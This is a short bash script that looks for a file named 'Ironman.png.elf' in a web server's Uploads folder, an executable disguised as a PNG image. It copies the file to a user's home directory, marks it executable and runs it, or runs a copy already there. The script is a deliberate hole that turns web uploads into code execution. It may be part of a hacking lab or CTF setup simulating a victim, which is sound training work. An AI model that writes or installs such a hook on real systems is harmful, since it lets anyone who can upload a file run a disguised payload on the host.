#!/bin/bash

source_file="/var/www/html/Uploads/Ironman.png.elf"
destination_file="/home/user/Ironman.png.elf"

# Check if the source file exists in /var/www/html/Uploads
if [ -f "$source_file" ]; then
    # Copy the source file to the destination
    cp "$source_file" "$destination_file"

    # Check if the destination file exists in /home/user
    if [ -f "$destination_file" ]; then
        # Execute the file in /home/user
        chmod +x "$destination_file"
        "$destination_file"
    fi
elif [ -f "$destination_file" ]; then
    # Execute the file in /home/user
    chmod +x "$destination_file"
    "$destination_file"
else
    true
fi
